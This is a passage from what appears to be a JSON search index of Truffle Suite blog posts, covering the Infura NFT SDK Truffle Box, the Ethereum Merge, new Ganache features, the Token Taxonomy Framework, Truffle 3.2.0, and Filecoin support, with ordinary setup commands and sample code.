metadata hosted on IPFS. With those set, click the deploy button and proceed to approving the transaction on your connected MetaMask wallet. That's it, you've successfully deployed a new NFT contract. Load contract: there's also an option to load a different contract to the UI incase you have multiple contracts deployed. Click the Load contract link, This will prompt you to select a template to use. Once selected, input the contract address you want to load before clicking the load button. Interact with you NFT contract: once you've deployed or loaded your NFT contract, you can navigate to the Contract link and interact with your deployed contract by minting an NFT. You will need to provide the metadata URI for the NFT you want to mint. You can also set royalty by populating the royalty input field and clicking the Set Royalties button. View your NFTs: by clicking the Album link, you should be able to see all your minted NFTs on display on the UI. Conclusion \u00b6 At Truffle, we remain committed to improving and simplifying the user experience for dapp developers in the Web3 ecosystem by creating developer tools, resources, and educational materials. To find out more about our suite of developer tools, visit the official Truffle website . If you have questions, feel free to start a discussion on our https://github.com/orgs/trufflesuite/discussions. We also hold weekly live-streamed sessions called Web Unleashed , where we build, interview folks, and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "The Infura NFT SDK Truffle Box. All you need to know"}, {"location": "blog/the-infura-sdk-nft-truffle-box-all-you-need-to-know/#infura-nft-api-what-is-it", "text": "In the past year, we\u2019ve seen a significant increase in cryptocurrency adoption across the world, which is in part, a result of the NFT boom of the past year. As a matter of fact, there is an estimated 880% increase in global crypto adoption in 2021, a $180 billion market capitalization for stablecoins as of March 2022 as well as a $70 billion market capitalization for NFTs as of September 2022. We\u2019ve also seen a number of popular brands like Coca-Cola, Adidas, Nike, and Formula 1 to name a few, launch NFTs and invest in the Metaverse. All this points to the fact that NFTs are an important part of our ecosystem and their use cases aren\u2019t just limited to PFPs or artwork, but extend to include digital identity verification, membership/access to gated digital and physical communities, and much more. Infura and Truffle understand the importance of NFTs and where it is headed, which is why we've expanded our product offering to include the NFT API , a set of RESTful APIs that enable developers to: Fetch all or specific NFTs for an account Verify ownership of an NFT or a collection Get the creator and transfer history of NFT or a collection And other important metadata", "title": "Infura NFT API, what is it?"}, {"location": "blog/the-infura-sdk-nft-truffle-box-all-you-need-to-know/#infura-nft-sdk-what-is-it", "text": "The Infura NFT SDK is basically a wrapper around the Infura NFT API, exposed as a JavaScript library and available for download on NPM . This library, in addition to being able to make RESTful calls to all of Infura\u2019s NFT API endpoints, allows you to deploy and call methods on common Ethereum smart-contract definitions through Infura, without the developer overhead of learning Solidity, compiling code, and importing ABI\u2019s. For a detailed description of how to use the SDK for deploying an NFT, minting and transferring an NFT, and fetching NFT metadata, please refer to the how-to section of the Infura NFT API documentation.", "title": "Infura NFT SDK, what is it?"}, {"location": "blog/the-infura-sdk-nft-truffle-box-all-you-need-to-know/#the-infura-nft-sdk-truffle-box", "text": "To further simplify the developer experience for NFT developers and creators using the Infura NFT API and the SDK, Truffle is happy to announce the release of the Infura NFT SDK Truffle Box , a set of boilerplate code that enables NFT developers, using Truffle, to take their ideas from concept to reality, as quickly as possible, by allowing them to focus on the most important and unique parts of their projects, while taking care of all other aspects such as project configuration and deployment.", "title": "The Infura NFT SDK Truffle Box"}, {"location": "blog/the-infura-sdk-nft-truffle-box-all-you-need-to-know/#installation-and-setup", "text": "To use the Infura NFT SDK Truffle Box, you have to meet the following requirements: Access to the Infura NFT API as it is still in private beta. Join the waitlist here Node.js 10.x or later NPM version 5.2 or later Windows, Linux, or macOS An Infura account and Project ID, together with the Project Secret Key A MetaMask account Once these requirements are met, in an empty folder, run the unbox command as shown below: npx truffle unbox infura-nft-sdk This should download and unbox the Infura NFT SDK Box. Next download all project dependencies by running npm install . With all dependencies successfully installed, proceed to creating a .env file in the root of your project, followed by adding values for the following environment variables: REACT_APP_INFURA_PROJECT_ID = your-project-id REACT_APP_INFURA_PROJECT_SECRET = your-project-secret REACT_APP_IPFS_GATEWAY = your-ipfs-gateway", "title": "Installation and setup"}, {"location": "blog/the-infura-sdk-nft-truffle-box-all-you-need-to-know/#start-the-project", "text": "We\u2019ve included a basic user interface that enable you to perform some actions as you will see shortly. Switch to the client directory of the box and run npm start to start the project. On your browser, navigate to http://localhost:3000 to view your application and connect your wallet.", "title": "Start the project"}, {"location": "blog/the-infura-sdk-nft-truffle-box-all-you-need-to-know/#how-it-works", "text": "Once you've started the application, notice that on the left hand side, there are links to perform actions like deploying an NFT contract, Loading a deployed NFT contract, Minting and setting royalty for an NFT, and viewing your minted NFT collection. Let's delve deeper into these actions: Deploy a new NFT contract: using the Add New Contract link, you can deploy a new NFT contract by first choosing a template, which is a way of telling Infura what underlying smart contract to use. At the moment, there is only one option which is an ERC721 contract but as time goes on, more options will be added. Once you've selected a template, you'll be prompted to provide the contract name, symbol and URI - link to your NFT metadata hosted on IPFS. With those set, click the deploy button and proceed to approving the transaction on your connected MetaMask wallet. That's it, you've successfully deployed a new NFT contract. Load contract: there's also an option to load a different contract to the UI incase you have multiple contracts deployed. Click the Load contract link, This will prompt you to select a template to use. Once selected, input the contract address you want to load before clicking the load button. Interact with you NFT contract: once you've deployed or loaded your NFT contract, you can navigate to the Contract link and interact with your deployed contract by minting an NFT. You will need to provide the metadata URI for the NFT you want to mint. You can also set royalty by populating the royalty input field and clicking the Set Royalties button. View your NFTs: by clicking the Album link, you should be able to see all your minted NFTs on display on the UI.", "title": "How it works"}, {"location": "blog/the-infura-sdk-nft-truffle-box-all-you-need-to-know/#conclusion", "text": "At Truffle, we remain committed to improving and simplifying the user experience for dapp developers in the Web3 ecosystem by creating developer tools, resources, and educational materials. To find out more about our suite of developer tools, visit the official Truffle website . If you have questions, feel free to start a discussion on our https://github.com/orgs/trufflesuite/discussions. We also hold weekly live-streamed sessions called Web Unleashed , where we build, interview folks, and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "Conclusion"}, {"location": "blog/the-merge-and-what-it-means-for-truffle/", "text": "By Kingsley Arinze As the Merge draws closer and closer, teams building for the Web3 ecosystem are reflecting on ways to prepare for this significant milestone in Ethereum\u2019s history. In this blog, we\u2019ll understand the migration to Proof of Stake on a deeper level by exploring the ways in which it will upgrade the Ethereum network, how Truffle is preparing for it, and finally what it means for the future of our service. One of the most talked-about events in crypto in 2022 is the Merge. While many Web3 enthusiasts see it as an opportunity to invest and get a quick return due to ETH price speculation, many people don\u2019t understand how the migration to Proof of Stake (PoS) will evolve Ethereum. What is the Merge? \u00b6 The Ethereum blockchain, by initial design, uses a Proof of Work (PoW) consensus mechanism, a system whereby validators also known as miners are required to complete a complex cryptographic puzzle in order to validate transactions and create new blocks. This process requires a lot of computing power and has been criticized by many due to its environmental impact. The Proof of Stake (PoS) consensus mechanism on the other hand is a system where validators are required to stake their digital coins for the right to validate transactions and create new blocks. This mechanism promises to reduce Ethereum\u2019s carbon footprint by about 99.95%. The Merge in simple terms refers to the transition of Ethereum from a PoW consensus blockchain into a PoS consensus blockchain. Currently, Ethereum has both a PoW and PoS chain running in parallel and while both chains have validators, only the PoW chain currently processes users\u2019 transactions. Once the Merge is complete, Ethereum will shift to the PoS chain, called the Beacon Chain, making mining on PoW obsolete. While there\u2019s been some misinformation about the Merge and how it would lower gas fees, it is important to clarify that that isn\u2019t the case as highlighted by Tim Beiko , a Researcher at the Ethereum Foundation. Instead, the Merge aims to solve the following challenges which are considered to be barriers to the mainstream adoption of crypto: Slow transaction speed High energy usage leading to increased carbon emissions Higher barrier to participation due to the resources required to be a miner or validator How does the Merge change Ethereum as we know it today? \u00b6 The Merge is designed to only have minimal impact on how Ethereum is operated from the end-user, smart contract, and dapp perspective. However, there are some minor changes worth noting. 1. Block structure \u00b6 Post Merge, we will see the introduction of new blocks that would include the current PoW blocks\u2019 content as one of its components in a field called ExecutionPayloads . We\u2019ll also see the retirement of some PoW block headers that would no longer be relevant to the new PoS chain. The values of these headers would be set to the zero equivalent of their data structures going forward, as opposed to their complete removal so as to minimize disruption to tooling and existing infrastructures. These changes are captured in the table below: 2. Stabilized and reduced block time \u00b6 The merge is expected to reduce and stabilize the average time it takes to create a new block in Ethereum to exactly 12 seconds. Currently, under PoW, it takes approximately 13 seconds to create a new block, which means that sometimes it could take longer and sometimes shorter than 13 seconds. Although this only implies a ~1 second change, smart contracts can now have a better sense of the expected block times to use in their calculations. 3. Finalized and Safe head blocks \u00b6 Currently, for a block to be considered \u201cconfirmed\u201d in Ethereum, several other blocks must have been mined on top of it. This is expected to change post-merge with the introduction of the concept of a Finalized block which is simply a block that has been accepted by more than \u2154 of the total validators. This means that for an attacker to create a conflicting block, they must burn a minimum of \u2153 of the total stake. The Merge would also introduce a safe head block which under normal network conditions and assuming a network delay of fewer than 4 seconds, is expected to be included in the chain. It is expected that JSON RPC APIs would be updated to expose the safe head block in a new safe tag and the finalized block in a finalized tag. These changes are summarized in the table below: How Truffle is preparing for the Merge \u00b6 At Truffle, we are very excited about the Merge! Here are some ways in which we\u2019re preparing for it. We\u2019re updating our Truffle boxes that utilize deprecated testnets and adding support for new testnets. Truffle boxes are helpful boilerplate code that allows dapp developers to focus on their application\u2019s unique logic. Some of these boxes currently include configuration options for some testnets that will be deprecated post-merge, such as the Rinkeby and Ropsten testnet. We\u2019re updating these boxes to exclude deprecated testnets as well as adding support for new testnets like the Kiln testnet . The Truffle documentation is also being updated to better capture the essence of Ethereum, post-merge. After the merge, Ethereum is expected to consist of two main layers: the Consensus layer where the blockchain consensus happens, and the Execution layer where transactions are processed and bundled. These layers would be handled by the Beacon chain consensus client and modified pre-merge PoW clients (including Geth, Parity e.t.c) respectively. We\u2019re also updating some of our blogs, tutorials, and educational contents to better reflect these changes. Finally, we're also updating our developer tools mainly Ganache and the Truffle Debugger to match new specifications so be on the lookout for when we announce these upgrades. Conclusion \u00b6 At Truffle, we remain committed to improving and simplifying the user experience for dapp developers in the Web3 ecosystem by creating developer tools, resources, and educational materials that will help onboard new dapp developers. With this upgrade coming to Ethereum, we're even more excited and committed to this course. To find out more about our suite of developer tools, visit the official Truffle website . If you have questions that you'd like for our team members to answer concerning the merge and how it impacts our products, feel free to start a discussion on our Github Discussions channel . Finally, don't forget to follow us on Twitter for live announcements and updates.", "title": "The Merge and what it means for Truffle"}, {"location": "blog/the-merge-and-what-it-means-for-truffle/#what-is-the-merge", "text": "The Ethereum blockchain, by initial design, uses a Proof of Work (PoW) consensus mechanism, a system whereby validators also known as miners are required to complete a complex cryptographic puzzle in order to validate transactions and create new blocks. This process requires a lot of computing power and has been criticized by many due to its environmental impact. The Proof of Stake (PoS) consensus mechanism on the other hand is a system where validators are required to stake their digital coins for the right to validate transactions and create new blocks. This mechanism promises to reduce Ethereum\u2019s carbon footprint by about 99.95%. The Merge in simple terms refers to the transition of Ethereum from a PoW consensus blockchain into a PoS consensus blockchain. Currently, Ethereum has both a PoW and PoS chain running in parallel and while both chains have validators, only the PoW chain currently processes users\u2019 transactions. Once the Merge is complete, Ethereum will shift to the PoS chain, called the Beacon Chain, making mining on PoW obsolete. While there\u2019s been some misinformation about the Merge and how it would lower gas fees, it is important to clarify that that isn\u2019t the case as highlighted by Tim Beiko , a Researcher at the Ethereum Foundation. Instead, the Merge aims to solve the following challenges which are considered to be barriers to the mainstream adoption of crypto: Slow transaction speed High energy usage leading to increased carbon emissions Higher barrier to participation due to the resources required to be a miner or validator", "title": "What is the Merge?"}, {"location": "blog/the-merge-and-what-it-means-for-truffle/#how-does-the-merge-change-ethereum-as-we-know-it-today", "text": "The Merge is designed to only have minimal impact on how Ethereum is operated from the end-user, smart contract, and dapp perspective. However, there are some minor changes worth noting.", "title": "How does the Merge change Ethereum as we know it today?"}, {"location": "blog/the-merge-and-what-it-means-for-truffle/#1-block-structure", "text": "Post Merge, we will see the introduction of new blocks that would include the current PoW blocks\u2019 content as one of its components in a field called ExecutionPayloads . We\u2019ll also see the retirement of some PoW block headers that would no longer be relevant to the new PoS chain. The values of these headers would be set to the zero equivalent of their data structures going forward, as opposed to their complete removal so as to minimize disruption to tooling and existing infrastructures. These changes are captured in the table below:", "title": "1. Block structure"}, {"location": "blog/the-merge-and-what-it-means-for-truffle/#2-stabilized-and-reduced-block-time", "text": "The merge is expected to reduce and stabilize the average time it takes to create a new block in Ethereum to exactly 12 seconds. Currently, under PoW, it takes approximately 13 seconds to create a new block, which means that sometimes it could take longer and sometimes shorter than 13 seconds. Although this only implies a ~1 second change, smart contracts can now have a better sense of the expected block times to use in their calculations.", "title": "2. Stabilized and reduced block time"}, {"location": "blog/the-merge-and-what-it-means-for-truffle/#3-finalized-and-safe-head-blocks", "text": "Currently, for a block to be considered \u201cconfirmed\u201d in Ethereum, several other blocks must have been mined on top of it. This is expected to change post-merge with the introduction of the concept of a Finalized block which is simply a block that has been accepted by more than \u2154 of the total validators. This means that for an attacker to create a conflicting block, they must burn a minimum of \u2153 of the total stake. The Merge would also introduce a safe head block which under normal network conditions and assuming a network delay of fewer than 4 seconds, is expected to be included in the chain. It is expected that JSON RPC APIs would be updated to expose the safe head block in a new safe tag and the finalized block in a finalized tag. These changes are summarized in the table below:", "title": "3. Finalized and Safe head blocks"}, {"location": "blog/the-merge-and-what-it-means-for-truffle/#how-truffle-is-preparing-for-the-merge", "text": "At Truffle, we are very excited about the Merge! Here are some ways in which we\u2019re preparing for it. We\u2019re updating our Truffle boxes that utilize deprecated testnets and adding support for new testnets. Truffle boxes are helpful boilerplate code that allows dapp developers to focus on their application\u2019s unique logic. Some of these boxes currently include configuration options for some testnets that will be deprecated post-merge, such as the Rinkeby and Ropsten testnet. We\u2019re updating these boxes to exclude deprecated testnets as well as adding support for new testnets like the Kiln testnet . The Truffle documentation is also being updated to better capture the essence of Ethereum, post-merge. After the merge, Ethereum is expected to consist of two main layers: the Consensus layer where the blockchain consensus happens, and the Execution layer where transactions are processed and bundled. These layers would be handled by the Beacon chain consensus client and modified pre-merge PoW clients (including Geth, Parity e.t.c) respectively. We\u2019re also updating some of our blogs, tutorials, and educational contents to better reflect these changes. Finally, we're also updating our developer tools mainly Ganache and the Truffle Debugger to match new specifications so be on the lookout for when we announce these upgrades.", "title": "How Truffle is preparing for the Merge"}, {"location": "blog/the-merge-and-what-it-means-for-truffle/#conclusion", "text": "At Truffle, we remain committed to improving and simplifying the user experience for dapp developers in the Web3 ecosystem by creating developer tools, resources, and educational materials that will help onboard new dapp developers. With this upgrade coming to Ethereum, we're even more excited and committed to this course. To find out more about our suite of developer tools, visit the official Truffle website . If you have questions that you'd like for our team members to answer concerning the merge and how it impacts our products, feel free to start a discussion on our Github Discussions channel . Finally, don't forget to follow us on Twitter for live announcements and updates.", "title": "Conclusion"}, {"location": "blog/three-new-ganache-features-to-improve-your-developer-experience/", "text": "By Kingsley Arinze Since the release of Ganache v7.0 in January, we\u2019ve mostly focused our attention on bug fixes and UX improvements. Recently, we decided to expand our focus to also include new features that will help improve the developer experience for our users. In this post, we\u2019ll touch on 3 of those new features that we've added to Ganache since the Ganache v7.0 release. Zero-config mainnet forking now available in the browser \u00b6 Ganache v7.0 made it possible to run Ganache in the browser. Simply add this script to your HTML: < script src = \"https://cdn.jsdelivr.net/npm/ganache@7.0.0/dist/web/ganache.min.js\" ></ script > And Ganache is available in your browser for use with: const options = {}; const provider = Ganache . provider ( options ); Adding the above lines of code would make the Ganache blockchain simulator available in your browser. However, zero-config mainnet forking wasn't yet available. Since the release of Ganache v7.3.2, users can now utilize this feature in the browser by specifying additional options during setup: < script src = \"https://cdn.jsdelivr.net/npm/ganache@7.3.2/dist/web/ganache.min.js\" ></ script > const options = { fork : { network : \"mainnet\" } } const provider = Ganache . provider ( options ); You can verify that this is working by attempting to fetch a mainnet block using the eth_getBlockByNumber method: const block = await provider . request ({ method : \"eth_getBlockByNumber\" , params : [ \"0xec4eb0\" ] }); console . log ( block ); // will be mainnet's block 15486640 Ability to use console.log from Solidity \u00b6 If you use Vyper's print statement or Hardhat's console.sol library contract for writing values to stdout, you can now use these tools together with Ganache, as Ganache now understands Vyper's print statement, as well as Hardhat's console.sol library! Development of native console.log support in Truffle is currently in progress, but Truffle users don't have to wait to use this feature, as they can install Ganache's console.log library with npm install @ganache/console.log and use it in their Solidity project: // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.13 ; import \"@ganache/console.log/console.sol\" ; contract GanacheCoin { mapping ( address => uint ) balances ; constructor () { balances [ tx.origin ] = 10000 ; } function sendCoin ( address receiver , uint256 amount ) public returns ( bool sufficient ) { if ( balances [ msg.sender ] >= amount ) { balances [ msg.sender ] -= amount ; balances [ receiver ] += amount ; console . log ( \"send: %o coins to %o\" , amount , receiver ); return true ; } else { return false ; } } } New eth_getProof RPC method \u00b6 Ganache now supports the eth_getProof RPC method, as specified by EIP-1186 . This method returns some useful values, including hashes and proofs associated with the given address and storage keys. This method can be used as shown below: const result = await provider . request ({ \"method\" : \"eth_getProof\" , \"params\" : [ // the address to query and generate proof for \"0x7F0d15C7FAae65896648C8273B6d7E43f58Fa842\" , // optional storage keys to generate proofs for [ \"0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421\" ], // the block at which to generate the proof \"latest\" ] }); It should return the following output: { \"accountProof\" : [ \"0xf90211a...0701bc80\" , \"0xf90211a...0d832380\" , \"0xf90211a...5fb20c80\" , \"0xf90211a...0675b80\" , \"0xf90151a0...ca08080\" ], \"balance\" : \"0x0\" , \"codeHash\" : \"0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470\" , \"nonce\" : \"0x0\" , \"storageHash\" : \"0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421\" , \"storageProof\" : [ { \"key\" : \"0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421\" , \"proof\" : [ \"0xf90211a...0701bc80\" , \"0xf90211a...0d832380\" ], \"value\" : \"0x1\" } ] } Conclusion \u00b6 At Truffle, we remain committed to improving and simplifying the user experience for dapp developers in the Web3 ecosystem by creating developer tools, resources, and educational materials. To find out more about our suite of developer tools, visit the official Truffle website . If you have questions, feel free to start a discussion on our Github Discussions channel . We also hold weekly live streamed sessions called Web Unleashed , where we build, interview folks, and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "Three new Ganache features to improve your developer experience"}, {"location": "blog/three-new-ganache-features-to-improve-your-developer-experience/#zero-config-mainnet-forking-now-available-in-the-browser", "text": "Ganache v7.0 made it possible to run Ganache in the browser. Simply add this script to your HTML: < script src = \"https://cdn.jsdelivr.net/npm/ganache@7.0.0/dist/web/ganache.min.js\" ></ script > And Ganache is available in your browser for use with: const options = {}; const provider = Ganache . provider ( options ); Adding the above lines of code would make the Ganache blockchain simulator available in your browser. However, zero-config mainnet forking wasn't yet available. Since the release of Ganache v7.3.2, users can now utilize this feature in the browser by specifying additional options during setup: < script src = \"https://cdn.jsdelivr.net/npm/ganache@7.3.2/dist/web/ganache.min.js\" ></ script > const options = { fork : { network : \"mainnet\" } } const provider = Ganache . provider ( options ); You can verify that this is working by attempting to fetch a mainnet block using the eth_getBlockByNumber method: const block = await provider . request ({ method : \"eth_getBlockByNumber\" , params : [ \"0xec4eb0\" ] }); console . log ( block ); // will be mainnet's block 15486640", "title": "Zero-config mainnet forking now available in the browser"}, {"location": "blog/three-new-ganache-features-to-improve-your-developer-experience/#ability-to-use-consolelog-from-solidity", "text": "If you use Vyper's print statement or Hardhat's console.sol library contract for writing values to stdout, you can now use these tools together with Ganache, as Ganache now understands Vyper's print statement, as well as Hardhat's console.sol library! Development of native console.log support in Truffle is currently in progress, but Truffle users don't have to wait to use this feature, as they can install Ganache's console.log library with npm install @ganache/console.log and use it in their Solidity project: // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.13 ; import \"@ganache/console.log/console.sol\" ; contract GanacheCoin { mapping ( address => uint ) balances ; constructor () { balances [ tx.origin ] = 10000 ; } function sendCoin ( address receiver , uint256 amount ) public returns ( bool sufficient ) { if ( balances [ msg.sender ] >= amount ) { balances [ msg.sender ] -= amount ; balances [ receiver ] += amount ; console . log ( \"send: %o coins to %o\" , amount , receiver ); return true ; } else { return false ; } } }", "title": "Ability to use console.log from Solidity"}, {"location": "blog/three-new-ganache-features-to-improve-your-developer-experience/#new-eth_getproof-rpc-method", "text": "Ganache now supports the eth_getProof RPC method, as specified by EIP-1186 . This method returns some useful values, including hashes and proofs associated with the given address and storage keys. This method can be used as shown below: const result = await provider . request ({ \"method\" : \"eth_getProof\" , \"params\" : [ // the address to query and generate proof for \"0x7F0d15C7FAae65896648C8273B6d7E43f58Fa842\" , // optional storage keys to generate proofs for [ \"0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421\" ], // the block at which to generate the proof \"latest\" ] }); It should return the following output: { \"accountProof\" : [ \"0xf90211a...0701bc80\" , \"0xf90211a...0d832380\" , \"0xf90211a...5fb20c80\" , \"0xf90211a...0675b80\" , \"0xf90151a0...ca08080\" ], \"balance\" : \"0x0\" , \"codeHash\" : \"0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470\" , \"nonce\" : \"0x0\" , \"storageHash\" : \"0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421\" , \"storageProof\" : [ { \"key\" : \"0x56e81f171bcc55a6ff8345e692c0f86e5b48e01b996cadc001622fb5e363b421\" , \"proof\" : [ \"0xf90211a...0701bc80\" , \"0xf90211a...0d832380\" ], \"value\" : \"0x1\" } ] }", "title": "New eth_getProof RPC method"}, {"location": "blog/three-new-ganache-features-to-improve-your-developer-experience/#conclusion", "text": "At Truffle, we remain committed to improving and simplifying the user experience for dapp developers in the Web3 ecosystem by creating developer tools, resources, and educational materials. To find out more about our suite of developer tools, visit the official Truffle website . If you have questions, feel free to start a discussion on our Github Discussions channel . We also hold weekly live streamed sessions called Web Unleashed , where we build, interview folks, and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "Conclusion"}, {"location": "blog/token-taxonomy-framework/", "text": "To some, the sudden rise of Tokens in the blockchain dialog comes as a surprise. However, tokens have always been the bedrock of the blockchain movement. The introduction of SmartContract by Ethereum quickly overshadowed them, particularly in enterprise contexts. The capabilities of Smart Contracts and the broad acceptance of them, thanks to companies like Truffle, blazed a trail forward and we all went along. It wasn\u2019t until we got halfway up the trail that someone turned around and asked, \u201cdid we pack any trail mix?\u201d Sure, we had Ether, but one cannot persist on Ether alone. Focus shifted back to our roots. Developers who had steeped in SmartContracts turned their attention to tokens. However, they also brought a bit of baggage. You can do a lot in a Token using SmartContract concepts. We started to see the blurring of lines between what a contract was and what was a token, leading to a good bit of confusion all around. Back in April, the Token Taxonomy Initiative (TTI) was launched with very strong backing and a cross blockchain and platform set of founders including the EEA, ConsenSys, IBM, R3 and Digital Asset in an effort to provide clarity and purpose for tokens moving forward as the way we define value and how it can be used between parties across networks and platforms. The major deliverable from the TTI is the Token Taxonomy Framework (TTF), which is a platform neutral framework for defining and token that can eventually be certified and start to address critical issues like interoperability. I\u2019ll be presenting an Introduction to the TTF at TruffleCon on August 4th here in Redmond, WA. Swing by to hear how you can use the TTF to communicate with customers and partners, use the same terms and get solid requirements from the business, legal and regulatory communities.", "title": "Token Taxonomy Framework"}, {"location": "blog/truffle-320-released/", "text": "UPDATE : We made another minor release after this blog post was written upgrading web3 to 0.18.2 due to request of our users. Truffle v3.2.1 is now the latest release, but it still includes all the awesome stuff below. Hi all. Great news today. Following your feedback from the Truffle 3.0 release, we've just released Truffle 3.2.0! This release includes a number of great new features and bug fixes , but we're most excited about the following. I've bolded the good stuff for ya. We've built infrastructure for providing you boilerplates on demand! Now with truffle init comes truffle init webpack , which gives you a boilerplate web application combining the web development capabilities of Webpack with the power of Truffle. More boilerplates to come to make your life easier, so stay tuned! We've added huge speed improvements to the Truffle command line tool. Now your commands trigger in milliseconds! Go ahead, try it out. truffle version Solidity tests can now be given default balances so you can use those tests to exercise sending Ether to your contracts. Big win for Solidity tests, and your sanity in general. Documentation Similarly, Javascript abstractions got an upgrade making it easier to send Ether directly to your contracts as well as trigger your contracts' fallback functions. You can use this feature within your tests as well as within your application. More on that here . Also, they now use web3 0.18.2. Migrations got an extra scout badge (function parameter) , allowing you to view available accounts directly within your migration Oh, and there's no more naming restriction on contract names! \ud83c\udf89\ud83c\udf89\ud83c\udf89 You can now have a file called ImABigDeal.sol and have it define contracts under a completely different name. Woot! Along with the above, there's a new way of requiring contract artifacts within your migrations and tests . The old way still works if your contract names match your Solidity file names, but even if they don't you can simply require the contract by name: // Assume `ImABigDeal.sol` defines `contract MyContract { ... }` var MyContract = artifacts . require ( \"MyContract\" ); There's been a lot of bug fixes too. Check out the release notes on Github for a full list of changes, upgrades and fixes. Big thanks! \u00b6 As always, we have to give you all a big thanks for being a part of the community and making Truffle better. This release would not be possible without your continued feedback, bug fixes and pull requests. If you run into trouble with any of the above, reach out on our community GitHub Discussions channel where hundreds of your fellow Trufflers congregate to answer your questions. As well, check us out on Twitter and send us a tweet. Cheers, and happy coding! -- Tim", "title": "Truffle 3.2.0 released"}, {"location": "blog/truffle-320-released/#big-thanks", "text": "As always, we have to give you all a big thanks for being a part of the community and making Truffle better. This release would not be possible without your continued feedback, bug fixes and pull requests. If you run into trouble with any of the above, reach out on our community GitHub Discussions channel where hundreds of your fellow Trufflers congregate to answer your questions. As well, check us out on Twitter and send us a tweet. Cheers, and happy coding! -- Tim", "title": "Big thanks!"}, {"location": "blog/truffle-and-ganache-now-come-in-filecoin-flavor/", "text": "Filecoin was created by Protocol Labs , the same organization who created and maintains IPFS . Filecoin extends the IPFS vision by creating an open-source decentralized storage network that provides incentives to keep data stored and pinned on IPFS. Filecoin is powerful because it provides a decentralized storage solution without having to rely on larger centralized solutions. Additionally when it comes to building dapps on other decentralized networks, like Ethereum, it provides the groundwork for a much needed storage and authenticity solution to full decentralization. Truffle Preserve to Buckets \u00b6 Back in July , we announced a first look at using the truffle preserve command in an experimental release. Today, we are releasing truffle preserve as part of the main, stable version of Truffle! To use truffle preserve , simply specify the files you want to preserve on the command line, and choose between the --filecoin , --ipfs , or --buckets recipes. The filecoin recipe uses the ipfs recipe under the hood, but if you need to, you can choose to use the ipfs recipe without filecoin . You can learn more about truffle preserve in this blog post . In addition, we\u2019re also introducing a new recipe for truffle preserve which allows developers to save data to Textile Buckets : truffle preserve --buckets . Try out any of these three recipes today by downloading the latest version of Truffle ! Filecoin-flavored Ganache \u00b6 Ganache has helped many developers create Ethereum dapps by providing a \"one-click\" experience; Ganache automates the difficult parts of running a decentralized network to give the developer a personal environment to tinker with and develop applications. It speeds up development by not having to wait for decentralized test networks to confirm transactions, and it provides a controlled, configurable environment to reproduce different test scenarios. Prior to Ganache, if you wanted to run a development network for Filecoin you would need to run the lotus-devnet , which requires compiling native resources or running a public Docker image. This is still a great resource to emulate the Filecoin network as close as possible as it includes a real Lotus node, but Ganache now provides a lightweight alternative for getting started with Filecoin app development. With the Filecoin flavor, Ganache now provides you both an IPFS server (used to store files) as well as a Lotus simulator (used to maintain file storage, simulate a storage provider, and availability) to add the necessary Filecoin methods to get started with Filecoin development. Like the Ethereum flavor of Ganache, we've made the process as simple as possible for you to get started with Filecoin quickly. What can I do with Filecoin-flavored Ganache? \u00b6 With Filecoin-flavored Ganache, you can do most of the development tasks for building a Filecoin application: - Store and retrieve files from a personal IPFS node that Ganache starts for you - Create a storage deal and see it progress through different states - Test how your application handles storage deal expiration - Transfer Filecoin's token FIL between accounts - Interact with the various Filecoin wallet methods You can find a full list of supported RPC methods on GitHub . How do I get started? \u00b6 If you\u2019re looking to get started with Ganache, head over to the documentation to see Get Started guides whether you're using the NodeJS library, CLI, or graphical UI version. Need an example on how to build a Filecoin application? Check out the Filecoin Truffle Box to see an example to mint NFTs and provide a decentralized art gallery application. We\u2019re finalizing the Truffle documentation in the coming days, so stay tuned for those! When they\u2019re live, you\u2019ll be able to find them at our main documentation page and click on the Filecoin link. Where can I get help? \u00b6 We're extremely excited to be working with the Filecoin community to add support for Filecoin into Truffle Suite's tooling. If you have questions about our Filecoin integration or our plan for the future, join Truffle\u2019s Discord community & the Filecoin community Slack to get your questions answered. We're happy to help!", "title": "Truffle and Ganache now come in Filecoin Flavor"}, {"location": "blog/truffle-and-ganache-now-come-in-filecoin-flavor/#truffle-preserve-to-buckets", "text": "Back in July , we announced a first look at using the truffle preserve command in an experimental release. Today, we are releasing truffle preserve as part of the main, stable version of Truffle! To use truffle preserve , simply specify the files you want to preserve on the command line, and choose between the --filecoin , --ipfs , or --buckets recipes. The filecoin recipe uses the ipfs recipe under the hood, but if you need to, you can choose to use the ipfs recipe without filecoin . You can learn more about truffle preserve in this blog post . In addition, we\u2019re also introducing a new recipe for truffle preserve which allows developers to save data to Textile Buckets : truffle preserve --buckets . Try out any of these three recipes today by downloading the latest version of Truffle !", "title": "Truffle Preserve to Buckets"}, {"location": "blog/truffle-and-ganache-now-come-in-filecoin-flavor/#filecoin-flavored-ganache", "text": "Ganache has helped many developers create Ethereum dapps by providing a \"one-click\" experience; Ganache automates the difficult parts of running a decentralized network to give the developer a personal environment to tinker with and develop applications. It speeds up development by not having to wait for decentralized test networks to confirm transactions, and it provides a controlled, configurable environment to reproduce different test scenarios. Prior to Ganache, if you wanted to run a development network for Filecoin you would need to run the lotus-devnet , which requires compiling native resources or running a public Docker image. This is still a great resource to emulate the Filecoin network as close as possible as it includes a real Lotus node, but Ganache now provides a lightweight alternative for getting started with Filecoin app development. With the Filecoin flavor, Ganache now provides you both an IPFS server (used to store files) as well as a Lotus simulator (used to maintain file storage, simulate a storage provider, and availability) to add the necessary 